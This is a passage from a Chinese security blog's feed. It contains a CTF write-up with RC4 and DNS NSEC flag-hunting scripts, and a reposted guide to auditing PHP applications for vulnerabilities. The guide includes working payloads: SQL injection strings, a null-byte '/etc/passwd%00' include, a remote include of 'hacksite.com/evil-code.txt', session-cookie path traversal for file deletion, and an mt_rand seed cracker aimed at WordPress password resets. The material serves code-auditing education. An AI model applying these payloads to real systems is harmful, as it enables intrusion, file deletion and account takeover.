      <content type="text"><![CDATA[前言今天跟大佬们在做EIS 2017运维挑战赛，我看的时候大佬们已经把web做的差不多了。所以我就来解决两道MISC。 RC4第一个是rc4的一个解密，挺简单的，手撸一个解密代码。 12345678910111213141516171819# -*- coding: utf-8 -*-#密文：下面十六进制的一串；密钥：hello worlddef rc4(data,key): j=0 s=range(256) for i in range(256): j=(j+s[i]+ord(key[i%len(key)]))%256 s[i],s[j]=s[j],s[i] i=0 j=0 out=[] for char in data: i=(i+1)%256 j=(j+s[i])%256 s[i],s[j]=s[j],s[i] out.append(chr(ord(char)^s[(s[i]+s[j])%256])) return ''.join(out)encodedata=rc4('\xCA\xEE\x86\x30\x48\xC4\xEC\x56\x3D\x22\x2A\xBC\x9A\x95\x70\x23\x39\x76\x3B\xEE\x09\x29\x2B\x01\x54\x00\x87\x5E\x37\x23\x3E\x79\x8B\x7B\xA9\x20\x78','hello world')print encodedata DNS 101这个题我是懵逼了一上午，dig了一早上TXT没想到玄机在与NSEC(DNSSEC 的一部分 — 用来验证一个未存在的服务器，使用与 NXT（已过时）记录的格式)。还有一点就是dig any的用法，这个当时也是没有考虑到。（多谢rebirth的指点） 12345678910111213141516171819202122# -*- coding: utf-8 -*-import reimport subprocesstarget = 'what.is.my.flag.src.edu-info.edu.cn'while 1: output = subprocess.Popen(['dig any'+' '+target],stdout=subprocess.PIPE,shell=True).communicate() #print output[0] result = re.findall(".*NSEC(.*). TXT.*",output[0]) print result[0].strip() target = result[0].strip() flag = subprocess.Popen(['dig'+' '+target+' '+'TXT'],stdout=subprocess.PIPE,shell=True).communicate() #EIS&#123;&#125;是flag的格式 if 'EIS' in flag[0]: print flag[0] break 最终结果：]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[[转载]高级PHP应用程序漏洞审核技术]]></title>
      <url>%2F2017%2F10%2F31%2F%E8%BD%AC%E8%BD%BD-%E9%AB%98%E7%BA%A7PHP%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%BC%8F%E6%B4%9E%E5%AE%A1%E6%A0%B8%E6%8A%80%E6%9C%AF%2F</url>
      <content type="text"><![CDATA[前言PHP是一种被广泛使用的脚本语言，尤其适合于web开发。具有跨平台，容易学习，功能强大等特点，据统计全世界有超过34%的网站有php的应用，包括Yahoo、sina、163、sohu等大型门户网站。而且很多具名的web应用系统（包括bbs,blog,wiki,cms等等）都是使用php开发的，Discuz、phpwind、phpbb、vbb、wordpress、boblog等等。 随着web安全的热点升级，php应用程序的代码安全问题也逐步兴盛起来，越来越多的安全人员投入到这个领域，越来越多的应用程序代码漏洞被披露。针对这样一个状况，很多应用程序的官方都成立了安全部门，或者雇佣安全人员进行代码审计，因此出现了很多自动化商业化的代码审计工具。 也就是这样的形势导致了一个局面：大公司的产品安全系数大大的提高，那些很明显的漏洞基本灭绝了，那些大家都知道的审计技术都无用武之地了。我们面对很多工具以及大牛扫描过n遍的代码，有很多的安全人员有点悲观，而有的官方安全人员也非常的放心自己的代码，但是不要忘记了“没有绝对的安全”，我们应该去寻找新的途径挖掘新的漏洞。本文就给介绍了一些非传统的技术经验和大家分享。 另外在这里特别说明一下本文里面很多漏洞都是来源于网络上牛人和朋友们的分享，在这里需要感谢他们 ：） 传统的代码审计技术WEB应用程序漏洞查找基本上是围绕两个元素展开：变量与函数。也就是说一漏洞的利用必须把你提交的恶意代码通过变量经过n次变量转换传递，最终传递给目标函数执行，还记得MS那句经典的名言吗？“一切输入都是有害的”。这句话只强调了变量输入，很多程序员把“输入”理解为只是gpc[$_GET,$_POST,$_COOKIE]，但是变量在传递过程产生了n多的变化。导致很多过滤只是个“纸老虎”！我们换句话来描叙下代码安全：“一切进入函数的变量是有害的”。 PHP代码审计技术用的最多也是目前的主力方法：静态分析，主要也是通过查找容易导致安全漏洞的危险函数，常用的如grep，findstr等搜索工具，很多自动化工具也是使用正则来搜索这些函数。下面列举一些常用的函数，也就是下文说的字典（暂略）。但是目前基本已有的字典很难找到漏洞，所以我们需要扩展我们的字典，这些字典也是本文主要探讨的。 其他的方法有：通过修改PHP源代码来分析变量流程，或者hook危险的函数来实现对应用程序代码的审核，但是这些也依靠了我们上面提到的字典。 PHP版本与应用代码审计到目前为止，PHP主要有3个版本：php4、php5、php6，使用比例大致如下： 版本 占比 说明 php4 68% 2000-2007，No security fixes after 2008/08，最终版本是php4.4.9 php5 32% 2004-present，Now at version 5.2.6（PHP 5.3 alpha1 released!） php6 目前还在测试阶段，变化很多做了大量的修改，取消了很多安全选项如magic_quotes_gpc 由于php缺少自动升级的机制，导致目前PHP版本并存，也导致很多存在漏洞没有被修补。这些有漏洞的函数也是我们进行WEB应用程序代码审计的重点对象，也是我们字典重要来源。 其他的因素与应用代码审计很多代码审计者拿到代码就看，他们忽视了“安全是一个整体”，代码安全很多的其他因素有关系，比如上面我们谈到的PHP版本的问题，比较重要的还有操作系统类型（主要是两大阵营win/*nix），WEB服务端软件（主要是iis/apache两大类型）等因素。这是由于不同的系统不同的WEB SERVER有着不同的安全特点或特性，下文有些部分会涉及。 所以我们在做某个公司WEB应用代码审计时，应该了解他们使用的系统，WEB服务端软件，PHP版本等信息。 扩展我们的字典下面将详细介绍一些非传统PHP应用代码审计一些漏洞类型和利用技巧。 变量本身的key 说到变量的提交很多人只是看到了GET/POST/COOKIE等提交的变量的值，但是忘记了有的程序把变量本身的key也当变量提取给函数处理。 12345678&lt;?php//key.php?aaaa'aaa=1&amp;bb'b=2 //print_R($_GET); foreach ($_GET AS $key =&gt; $value)&#123; print $key."\n";&#125;?&gt; 上面的代码就提取了变量本身的key显示出来，单纯对于上面的代码，如果我们提交URL： 1key.php?&lt;script&gt;alert(1);&lt;/script&gt;=1&amp;bbb=2 那么就导致一个xss的漏洞，扩展一下如果这个key提交给include()等函数或者sql查询呢？：） 漏洞审计策略 PHP版本要求 : 无 系统要求 : 无 审计策略 : 通读代码 变量覆盖 很多的漏洞查找者都知道extract()这个函数在指定参数为EXTR_OVERWRITE或者没有指定函数可以导致变量覆盖，但是还有很多其他情况导致变量覆盖的如： 遍历初始化变量请看如下代码： 12345678&lt;?php//var.php?a=fuck$a='hi';foreach($_GET as $key =&gt; $value) &#123; $$key = $value;&#125;print $a;?&gt; 很多的WEB应用都使用上面的方式（注意循环不一定是foreach），如Discuz!4.1的WAP部分的代码： 1234567$chs = '';if($_POST &amp;&amp; $charset != 'utf-8') &#123; $chs = new Chinese('UTF-8', $charset); foreach($_POST as $key =&gt; $value) &#123; $$key = $chs-&gt;Convert($value); &#125; unset($chs); 漏洞审计策略 PHP版本要求：无 系统要求：无 审计策略：通读代码 parse_str()变量覆盖漏洞1234//var.php?var=new$var = 'init'; parse_str($_SERVER['QUERY_STRING']); print $var; 该函数一样可以覆盖数组变量，上面的代码是通过$_SERVER[‘QUERY_STRING’]来提取变量的，对于指定了变量名的我们可以通过注射“=”来实现覆盖其他的变量： 1234//var.php?var=1&amp;a[1]=var1%3d222$var1 = 'init';parse_str($a[$_GET['var']]);print $var1; 上面的代码通过提交$var来实现对$var1的覆盖。 漏洞审计策略（parse_str） PHP版本要求：无 系统要求：无 审计策略：查找字符parse_str 漏洞审计策略（mb_parse_str） PHP版本要求：php4&lt;4.4.7 php5&lt;5.2.2 系统要求：无 审计策略：查找字符mb_parse_str import_request_variables()变量覆盖漏洞12345//var.php?_SERVER[REMOTE_ADDR]=10.1.1.1echo 'GLOBALS '.(int)ini_get("register_globals")."n";import_request_variables('GPC');if ($_SERVER['REMOTE_ADDR'] != '10.1.1.1') die('Go away!');echo 'Hello admin!'; 漏洞审计策略（import_request_variables） PHP版本要求：php4&lt;4.4.1 php5&lt;5.2.2 系统要求：无 审计策略：查找字符import_request_variables PHP5 Globals从严格意义上来说这个不可以算是PHP的漏洞，只能算是一个特性，测试代码： 12345&lt;?php//register_globals = &apos;ON&apos;//foo.php?GLOBALS[foobar]=HELLOecho $foobar; ?&gt; 但是很多的程序没有考虑到这点，请看如下代码： 12345//为了安全取消全局变量//var.php?GLOBALS[a]=aaaa&amp;b=111if (ini_get('register_globals')) foreach($_REQUEST as $k=&gt;$v) unset($&#123;$k&#125;);print $a;print $_GET[b]; 如果熟悉WEB2.0的攻击的同学，很容易想到上面的代码我们可以利用这个特性进行crsf攻击。 漏洞审计策略 PHP版本要求：无 系统要求：无 审计策略：通读代码 magic_quotes_gpc与代码安全 什么是magic_quotes_gpc当打开时，所有的 ‘（单引号），”（双引号），\（反斜线）和 NULL 字符都会被自动加上一个反斜线进行转义。还有很多函数有类似的作用 如：addslashes()、mysql_escape_string()、mysql_real_escape_string()等，另外还有parse_str()后的变量也受magic_quotes_gpc的影响。目前大多数的主机都打开了这个选项，并且很多程序员也注意使用上面那些函数去过滤变量，这看上去很安全。很多漏洞查找者或者工具遇到些函数过滤后的变量直接就放弃，但是就在他们放弃的同时也放过很多致命的安全漏洞。 ：） 哪些地方没有魔术引号的保护1) $_SERVER变量 PHP5的$_SERVER变量缺少magic_quotes_gpc的保护，导致近年来X-Forwarded-For的漏洞猛暴，所以很多程序员考虑过滤X-Forwarded-For，但是其他的变量呢？ 漏洞审计策略（$_SERVER变量） PHP版本要求：无 系统要求：无 审计策略：查找字符_SERVER 2) getenv()得到的变量（使用类似$_SERVER变量） 漏洞审计策略（getenv()） PHP版本要求：无 系统要求：无 审计策略：查找字符getenv 3) $HTTP_RAW_POST_DATA与PHP输入、输出流 主要应用与soap/xmlrpc/webpublish功能里，请看如下代码： 12345if ( !isset( $HTTP_RAW_POST_DATA ) ) &#123; $HTTP_RAW_POST_DATA = file_get_contents( 'php://input' );&#125;if ( isset($HTTP_RAW_POST_DATA) ) $HTTP_RAW_POST_DATA = trim($HTTP_RAW_POST_DATA); 漏洞审计策略（数据流） PHP版本要求：无 系统要求：无 审计策略：查找字符HTTP_RAW_POST_DATA或者php://input 4) 数据库操作容易忘记’的地方如：in()/limit/order by/group by 如Discuz!&lt;5.0的pm.php：​ 1234567891011if(is_array($msgtobuddys)) &#123; $msgto = array_merge($msgtobuddys, array($msgtoid)); ......foreach($msgto as $uid) &#123; $uids .= $comma.$uid; $comma = ',';&#125;......$query = $db-&gt;query("SELECT m.username, mf.ignorepm FROM &#123;$tablepre&#125;members m LEFT JOIN &#123;$tablepre&#125;memberfields mf USING(uid) WHERE m.uid IN ($uids)"); 漏洞审计策略 PHP版本要求：无 系统要求：无 审计策略：查找数据库操作字符（select,update,insert等等） 变量的编码与解码一个WEB程序很多功能的实现都需要变量的编码解码，而且就在这一转一解的传递过程中就悄悄的绕过你的过滤的安全防线。 这个类型的主要函数有： 1) stripslashes() 这个其实就是一个decode-addslashes() 2) 其他字符串转换函数： 函数 说明 base64_decode 对使用 MIME base64 编码的数据进行解码 base64_encode 使用 MIME base64 对数据进行编码 rawurldecode 对已编码的 URL 字符串进行解码 rawurlencode 按照 RFC 1738 对 URL 进行编码 urldecode 解码已编码的 URL 字符串 urlencode 编码 URL 字符串 另外一个 unserialize/serialize 3) 字符集函数（GKB,UTF7/8…）如iconv()/mb_convert_encoding()等 目前很多漏洞挖掘者开始注意这一类型的漏洞了，如典型的urldecode： 1$sql = "SELECT * FROM article WHERE articleid='".urldecode($_GET[id])."'"; 当magic_quotes_gpc=on时，我们提交?id=%2527，得到sql语句为： 1SELECT * FROM article WHERE articleid=''' 漏洞审计策略 PHP版本要求：无 系统要求：无 审计策略：查找对应的编码函数 二次攻击详细见附录 [1] 1) 数据库出来的变量没有进行过滤 2) 数据库的转义符号： mysql/oracle转义符号同样是\（我们提交’通过魔术引号变化为\’，当我们update进入数据库时，通过转义变为’） mssql的转义字符为’（所以我们提交’通过魔术引号变化为\’，mssql会把它当为一个字符串直接处理，所以魔术引号对于mssql的注射没有任何意义） 从这里我们可以思考得到一个结论：一切进入函数的变量都是有害的，另外利用二次攻击我们可以实现一个webrootkit，把我们的恶意构造直接放到数据库里。我们应当把这样的代码看成一个vul？ 漏洞审计策略 PHP版本要求：无 系统要求：无 审计策略：通读代码 魔术引号带来的新的安全问题首先我们看下魔术引号的处理机制： 1[\--&gt;\\,&apos;--&gt;\&apos;,&quot;--&gt;\&quot;,null--&gt;\0] 这给我们引进了一个非常有用的符号“\”，“\”符号不仅仅是转义符号，在WIN系统下也是目录转跳的符号。这个特点可能导致php应用程序里产生非常有意思的漏洞： 1)得到原字符（’,\,”,null]） 12345678910$order_sn=substr($_GET['order_sn'], 1);//提交 '//魔术引号处理 \'//substr '$sql = "SELECT order_id, order_status, shipping_status, pay_status, ". " shipping_time, shipping_id, invoice_no, user_id ". " FROM " . $ecs-&gt;table('order_info'). " WHERE order_sn = '$order_sn' LIMIT 1"; 2)得到“\”字符 12345678910$order_sn=substr($_GET['order_sn'], 0,1);//提交 '//魔术引号处理 \'//substr \ $sql = "SELECT order_id, order_status, shipping_status, pay_status, ". " shipping_time, shipping_id, invoice_no, user_id ". " FROM " . $ecs-&gt;table('order_info'). " WHERE order_sn = '$order_sn' and order_tn='".$_GET['order_tn']."'"; 提交内容： 1?order_sn=&apos;&amp;order_tn=%20and%201=1/* 执行的SQL语句为： 123SELECT order_id, order_status, shipping_status, pay_status, shipping_time, shipping_id, invoice_no, user_id FROM order_info WHERE order_sn = '\' and order_tn=' and 1=1/*' 漏洞审计策略 PHP版本要求：无 系统要求：无 审计策略：查找字符串处理函数如substr或者通读代码 变量key与魔术引号我们最在这一节的开头就提到了变量key，PHP的魔术引号对它有什么影响呢？ 12345678&lt;?php//key.php?aaaa'aaa=1&amp;bb'b=2 //print_R($_GET); foreach ($_GET AS $key =&gt; $value) &#123; print $key."\n"; &#125;?&gt; 1)当magic_quotes_gpc = On时，在php5.24下测试显示： 12aaaa\'aaabb\'b 从上面结果可以看出来，在设置了magic_quotes_gpc = On下，变量key受魔术引号影响。但是在php4和php&lt;5.2.1的版本中，不处理数组第一维变量的key，测试代码如下： 1234&lt;?php//key.php?aaaa'aaa[bb']=1 print_R($_GET); ?&gt; 结果显示: 1Array ( [aaaa'aaa] =&gt; Array ( [bb\'] =&gt; 1 ) ) 数组第一维变量的key不受魔术引号的影响。 漏洞审计策略 PHP版本要求：php4和php&lt;5.2.1 系统要求：无 审计策略：通读代码 2)当magic_quotes_gpc = Off时，在php5.24下测试显示： 12aaaa'aaabb'b 对于magic_quotes_gpc = Off时所有的变量都是不安全的，考虑到这个，很多程序都通过addslashes等函数来实现魔术引号对变量的过滤，示例代码如下： 123456789101112131415161718&lt;?php //keyvul.php?aaa'aa=1'//magic_quotes_gpc = Off if (!get_magic_quotes_gpc())&#123; $_GET = addslashes_array($_GET);&#125;function addslashes_array($value)&#123; return is_array($value) ? array_map('addslashes_array', $value) : addslashes($value);&#125;print_R($_GET);foreach ($_GET AS $key =&gt; $value)&#123; print $key;&#125;?&gt; 以上的代码看上去很完美，但是他这个代码里addslashes($value)只处理了变量的具体的值，但是没有处理变量本身的key，上面的代码显示结果如下： 12345Array( [aaa'aa] =&gt; 1\')aaa'aa 漏洞审计策略 PHP版本要求：无 系统要求：无 审计策略：通读代码 代码注射 PHP中可能导致代码注射的函数很多人都知道eval、preg_replace+/e可以执行代码，但是不知道php还有很多的函数可以执行代码如： 函数 assert() call_user_func() call_user_func_array() create_function() 变量函数 这里我们看看最近出现的几个关于create_function()代码执行漏洞的代码： 12345678&lt;?php//how to exp this code$sort_by=$_GET['sort_by'];$sorter='strnatcasecmp';$databases=array('test','test');$sort_function = ' return 1 * ' . $sorter . '($a["' . $sort_by . '"], $b["' . $sort_by . '"]); ';usort($databases, create_function('$a, $b', $sort_function)); 漏洞审计策略 PHP版本要求：无 系统要求：无 审计策略：查找对应函数（assert,call_user_func,call_user_func_array,create_function等） 变量函数与双引号对于单引号和双引号的区别，很多程序员深有体会，示例代码： 12echo "$a\n";echo '$a\n'; 我们再看如下代码： 12345678//how to exp this codeif($globals['bbc_email'])&#123;$text = preg_replace( array("/\[email=(.*?)\](.*?)\[\/email\]/ies", "/\[email\](.*?)\[\/email\]/ies"), array('check_email("$1", "$2")', 'check_email("$1", "$1")'), $text); 另外很多的应用程序都把变量用””存放在缓存文件或者config或者data文件里，这样很容易被人注射变量函数。 漏洞审计策略 PHP版本要求：无 系统要求：无 审计策略：通读代码 PHP自身函数漏洞及缺陷 PHP函数的溢出漏洞大家还记得Stefan Esser大牛的Month of PHP Bugs（MOPB见附录 [2]）项目么，其中比较有名的要算是unserialize()，代码如下： 1unserialize(stripslashes($HTTP_COOKIE_VARS[$cookiename . '_data']); 在以往的PHP版本里，很多函数都曾经出现过溢出漏洞，所以我们在审计应用程序漏洞的时候不要忘记了测试目标使用的PHP版本信息。 漏洞审计策略 PHP版本要求：对应fix的版本 系统要求： 审计策略：查找对应函数名 PHP函数的其他漏洞Stefan Esser大牛发现的漏洞：unset()–Zend_Hash_Del_Key_Or_Index Vulnerability​比如phpwind早期的serarch.php里的代码： 123456789unset($uids);......$query=$db-&gt;query("SELECT uid FROM pw_members WHERE username LIKE '$pwuser'");while($member=$db-&gt;fetch_array($query))&#123; $uids .= $member['uid'].',';&#125;$uids ? $uids=substr($uids,0,-1) : $sqlwhere.=' AND 0 ';........$query = $db-&gt;query("SELECT DISTINCT t.tid FROM $sqltable WHERE $sqlwhere $orderby $limit"); 漏洞审计策略 PHP版本要求：php4&lt;4.3 php5&lt;5.14 系统要求：无 审计策略：查找unset session_destroy()删除文件漏洞测试PHP版本：5.1.2​这个漏洞是几年前朋友saiy发现的，session_destroy()函数的功能是删除session文件，很多web应用程序的logout的功能都直接调用这个函数删除session，但是这个函数在一些老的版本中缺少过滤导致可以删除任意文件。测试代码如下： 12345678910111213&lt;?php //val.php session_save_path('./');session_start();if($_GET['del']) &#123; session_unset(); session_destroy();&#125;else&#123; $_SESSION['hei']=1; echo(session_id()); print_r($_SESSION);&#125;?&gt; 当我们提交构造cookie:PHPSESSID=/../1.php，相当于unlink(‘sess_/../1.php’)这样就通过注射../转跳目录删除任意文件了。很多著名的程序某些版本都受影响如phpmyadmin，sablog，phpwind3等等。 漏洞审计策略 PHP版本要求：具体不详 系统要求：无 审计策略：查找session_destroy 随机函数1) rand() VS mt_rand() 12345&lt;?php//on windowsprint mt_getrandmax(); //2147483647print getrandmax();// 32767?&gt; 可以看出rand()最大的随机数是32767，这个很容易被我们暴力破解。 12345678910&lt;?php$a= md5(rand());for($i=0;$i&lt;=32767;$i++)&#123; if(md5($i) ==$a ) &#123; print $i."--&gt;ok!! || ";exit; &#125;else &#123; print $i." || ";&#125;&#125;?&gt; 当我们的程序使用rand处理session时，攻击者很容易暴力破解出你的session，但是对于mt_rand是很难单纯的暴力的。 漏洞审计策略 PHP版本要求：无 系统要求：无 审计策略：查找rand 2) mt_srand()/srand()-weak seeding（by Stefan Esser） 看php手册里的描述： 123456mt_srand(PHP 3 &gt;= 3.0.6, PHP 4, PHP 5)mt_srand -- 播下一个更好的随机数发生器种子说明void mt_srand ( int seed ) 用 seed 来给随机数发生器播种。从 PHP 4.2.0 版开始，seed 参数变为可选项，当该项为空时，会被设为随时数。 例子 1. mt_srand() 范例 12345678910&lt;?php// seed with microsecondsfunction make_seed()&#123; list($usec, $sec) = explode(' ', microtime()); return (float) $sec + ((float) $usec * 100000);&#125;mt_srand(make_seed());$randval = mt_rand();?&gt; _注: 自 PHP 4.2.0 起，不再需要用 srand() 或 mtsrand() 函数给随机数发生器播种，现已自动完成。 php从4.2.0开始实现了自动播种，但是为了兼容，后来使用类似于这样的代码播种： 1mt_srand ((double) microtime() * 1000000) 但是使用(double)microtime()*1000000类似的代码seed是比较脆弱的： 10&lt;(double) microtime()&lt;1 ---&gt; 0&lt;(double) microtime()* 1000000&lt;1000000 那么很容易暴力破解,测试代码如下： 123456789101112131415161718192021222324&lt;?php///////////////////&gt;php rand.php//828682//828682////////////////ini_set("max_execution_time",0);$time=(double) microtime()* 1000000;print $time."\n";mt_srand ($time);$search_id = mt_rand();$seed = search_seed($search_id);print $seed;function search_seed($rand_num) &#123;$max = 1000000;for($seed=0;$seed&lt;=$max;$seed++)&#123; mt_srand($seed); $key = mt_rand(); if($key==$rand_num) return $seed;&#125;return false;&#125;?&gt; 从上面的代码实现了对seed的破解，另外根据Stefan Esser的分析seed还根据进程变化而变化，换句话来说同一个进程里的seed是相同的。 然后同一个seed每次mt_rand的值都是特定的。如下图： 例A seed-A mt_rand-A-1 mt_rand-A-2 mt_rand-A-3 例B seed-B mt_rand-B-1 mt_rand-B-2 mt_rand-B-3 对于seed-A里mt_rand-1/2/3都是不相等的，但是值都是特定的，也就是说当seed-A等于seed-B，那么mt_rand-A-1就等于mt_rand-B-1…，这样我们只要能够得到seed就可以得到每次mt_rand的值了。 对于5.2.6&gt;php&gt;4.2.0直接使用默认播种的程序也是不安全的（很多的安全人员错误的以为这样就是安全的），这个要分两种情况来分析： 第一种：’Cross Application Attacks’，这个思路在Stefan Esser文章里有提到，主要是利用其他程序定义的播种（如mt_srand ((double) microtime()* 1000000)），phpbb+wordpree组合就存在这样的危险. 第二种：5.2.6&gt;php&gt;4.2.0默认播种的算法也不是很强悍，这是Stefan Esser的文章里的描述：The Implementation When mt_rand() is seeded internally or by a call to mt_srand() PHP 4 and PHP 5 &lt;= 5.2.0 force the lowest bit to 1. Therefore the strength of the seed is only 31 and not 32 bits. In PHP 5.2.1 and above the implementation of the Mersenne Twister was changed and the forced bit removed. 在32位系统上默认的播种的种子为最大值是2^32，这样我们循环最多2^32次就可以破解seed。而在PHP 4和PHP 5 &lt;= 5.2.0 的算法有个bug：奇数和偶数的播种是一样的（详见附录 [3] ）,测试代码如下： 1234567&lt;?phpmt_srand(4); $a = mt_rand(); mt_srand(5); $b = mt_rand();print $a."\n".$b;?&gt; 通过上面的代码发现$a==$b，所以我们循环的次数为2^32/2=2^31次。我们看如下代码： 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php//base on http://www.milw0rm.com/exploits/6421 //test on php 5.2.0define('BUGGY', 1); //上面代码$a==$b时候定义BUGGY=1$key = wp_generate_password(20, false);echo $key."\n";$seed = getseed($key);print $seed."\n"; mt_srand($seed);$pass = wp_generate_password(20, false);echo $pass."\n"; function wp_generate_password($length = 12, $special_chars = true) &#123; $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; if ( $special_chars ) $chars .= '!@#$%^&amp;*()'; $password = ''; for ( $i = 0; $i &lt; $length; $i++ ) $password .= substr($chars, mt_rand(0, strlen($chars) - 1), 1); return $password;&#125; function getseed($resetkey) &#123; $max = pow(2,(32-BUGGY)); for($x=0;$x&lt;=$max;$x++) &#123; $seed = BUGGY ? ($x &lt;&lt; 1) + 1 : $x; mt_srand($seed); $testkey = wp_generate_password(20,false); if($testkey==$resetkey) &#123; echo "o\n"; return $seed; &#125; if(!($x % 10000)) echo $x / 10000; &#125; echo "\n"; return false;&#125;?&gt; 运行结果如下： 12345678910111213141516php5&gt;php rand.phpM8pzpjwCrvVt3oobAaOr01234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522..............010621106221062310624106251062610627106281062910630106311063210633o70693pjwCrvVt3oobAaOr 当10634次时候我们得到了结果。 当PHP版本到了5.2.1后，通过修改算法修补了奇数和偶数的播种相等的问题，这样也导致了php5.2.0前后导致同一个播种后的mt_rand()的值不一样。比如： 123456&lt;?phpmt_srand(42);echo mt_rand();//php&lt;=5.20 1387371436//php&gt;5.20 1354439493 ?&gt; 正是这个原因，也要求了我们的exp的运行环境：当目标&gt;5.20时候，我们exp运行的环境也要是&gt;5.20的版本，反过来也是一样。 从上面的测试及分析来看，php&lt;5.26不管有没有定义播种，mt_rand处理的数据都是不安全的。在web应用里很多都使用mt_rand来处理随机的session，比如密码找回功能等等，这样的后果就是被攻击者恶意利用直接修改密码。 很多著名的程序都产生了类似的漏洞如wordpress、phpbb、punbb等等。（在后面我们将实际分析下国内著名的bbs程序Discuz!的mt_srand导致的漏洞） 漏洞审计策略 PHP版本要求：php4 php5&lt;5.2.6 系统要求：无 审计策略：查找mt_srand/mt_rand 特殊字符 其实“特殊字符”也没有特定的标准定义，主要是在一些code hacking发挥着特殊重作用的一类字符。下面就举几个例子： 截断其中最有名的数大家都熟悉的null字符截断。 include截断123&lt;?php include $_GET['action'].".php"; ?&gt; 提交“action=/etc/passwd%00”中的“%00”将截断后面的“.php”，但是除了“%00”还有没有其他的字符可以实现截断使用呢？肯定有人想到了远程包含的url里问号“?”的作用，通过提交“action=http://www.hacksite.com/evil-code.txt?”这里“?”实现了“伪截断”：），好象这个看上去不是那么舒服那么我们简单写个代码fuzz一下： 1234567891011121314151617181920&lt;?php////////////////////////var5.php代码:////include $_GET['action'].".php"; ////print strlen(realpath("./"))+strlen($_GET['action']); ///////////////////ini_set('max_execution_time', 0);$str='';for($i=0;$i&lt;50000;$i++)&#123; $str=$str."/"; $resp=file_get_contents('http://127.0.0.1/var/var5.php?action=1.txt'.$str); //1.txt里的代码为print 'hi'; if (strpos($resp, 'hi') !== false)&#123; print $i; exit; &#125;&#125;?&gt; 经过测试字符“.”、“ /”或者2个字符的组合，在一定的长度时将被截断，win系统和*nix的系统长度不一样，当win下strlen(realpath(“./“))+strlen($_GET[&#39;action&#39;])的长度大于256时被截断，对于*nix的长度是4 * 1024 = 4096。对于php.ini里设置远程文件关闭的时候就可以利用上面的技巧包含本地文件了。（此漏洞由cloie#ph4nt0m.org最先发现]） 数据截断对于很多web应用文件在很多功能是不容许重复数据的，比如用户注册功能等。一般的应用程序对于提交注册的username和数据库里已有的username对比是不是已经有重复数据，然而我们可以通过“数据截断”等来饶过这些判断，数据库在处理时候产生截断导致插入重复数据。 1) Mysql SQL Column Truncation Vulnerabilities 这个漏洞又是大牛Stefan Esser发现的（Stefan Esser是我的偶像:)），这个是由于mysql的sql_mode设置为default的时候，即没有开启STRICT_ALL_TABLES选项时，MySQL对于插入超长的值只会提示warning，而不是error（如果是error就插入不成功），这样可能会导致一些截断问题。测试如下：​ 12345678910111213mysql&gt; insert into truncated_test(`username`,`password`) values("admin","pass");mysql&gt; insert into truncated_test(`username`,`password`) values("admin x", "new_pass");Query OK, 1 row affected, 1 warning (0.01 sec)mysql&gt; select * from truncated_test;+----+------------+----------+| id | username | password |+----+------------+----------+| 1 | admin | pass || 2 | admin | new_pass |+----+------------+----------+2 rows in set (0.00 sec) 2) Mysql charset Truncation vulnerability 这个漏洞是80sec发现的，当mysql进行数据存储处理utf8等数据时对某些字符导致数据截断。测试如下：​ 123456789101112mysql&gt; insert into truncated_test(`username`,`password`) values(concat("admin",0xc1), "new_pass2");Query OK, 1 row affected, 1 warning (0.00 sec)mysql&gt; select * from truncated_test;+----+------------+----------+| id | username | password |+----+------------+----------+| 1 | admin | pass || 2 | admin | new_pass || 3 | admin | new_pass2 |+----+------------+----------+2 rows in set (0.00 sec) 很多的web应用程序没有考虑到这些问题，只是在数据存储前简单查询数据是否包含相同数据，如下代码： 12345$result = mysql_query("SELECT * from test_user where user='$user' "); ....if(@mysql_fetch_array($result, MYSQL_NUM)) &#123; die("already exist");&#125; 漏洞审计策略 PHP版本要求：无 系统要求：无 审计策略：通读代码 文件操作里的特殊字符文件操作里有很多特殊的字符，发挥特别的作用，很多web应用程序没有注意处理这些字符而导致安全问题。比如很多人都知道的windows系统文件名对“空格”和“.”等的忽视，这个主要体现在上传文件或者写文件上，导致直接写webshell。另外对于windows系统对“...\”进行系统转跳等等。​下面还给大家介绍一个非常有意思的问题： 1234567//Is this code vul?if( eregi(".php",$url) )&#123; die("ERR");&#125;$fileurl=str_replace($webdb[www_url],"",$url);.....header('Content-Disposition: attachment; filename='.$filename); 很多人看出来了上面的代码的问题，程序首先禁止使用“.php”后缀。但是下面居然接了个str_replace替换$webdb[www_url]为空，那么我们提交“.p$webdb[www_url]hp”就可以饶过了。那么上面的代码杂fix呢？有人给出了如下代码： 1234$fileurl=str_replace($webdb[www_url],"",$url);if( eregi(".php",$url) )&#123; die("ERR");&#125; str_replace提到前面了，很完美的解决了str_replace代码的安全问题，但是问题不是那么简单，上面的代码在某些系统上一样可以突破。接下来我们先看看下面的代码： 1234567&lt;?phpfor($i=0;$i&lt;255;$i++) &#123; $url = '1.ph'.chr($i); $tmp = @file_get_contents($url); if(!empty($tmp)) echo chr($i)."\r\n";&#125; ?&gt; 我们在windows系统运行上面的代码得到如下字符* &lt; &gt; ? P p都可以打开目录下的1.php。 漏洞审计策略 PHP版本要求：无 系统要求：无 审计策略：文读取件操作函数 怎么进一步寻找新的字典上面我们列举很多的字典，但是很多都是已经公开过的漏洞或者方式，那么我们怎么进一步找到新的字典或者利用方式呢？ 分析和学习别人发现的漏洞或者exp，总结出漏洞类型及字典 通过学习php手册或者官方文档,挖掘出新的有危害的函数或者利用方式 fuzz php的函数，找到新的有问题的函数（不一定非要溢出的），如上一章的4.6的部分很多都可以简单的fuzz脚本可以测试出来 分析php源代码，发现新的漏洞函数“特性”或者漏洞。（在上一节里介绍的那些“漏洞审计策略”里，都没有php源代码的分析，如果你要进一步找到新的字典，可以在php源代码的基础上分析下成因，然后根据这个成因来分析寻找新的漏洞函数“特性”或者漏洞。）（我们以后会陆续公布一些我们对php源代码的分析） 有条件或者机会和开发者学习，找到他们实现某些常用功能的代码的缺陷或者容易忽视的问题 你有什么要补充的吗？ ：） DEMO DEMO *DEMO – Discuz! Reset User Password 0day Vulnerability 分析 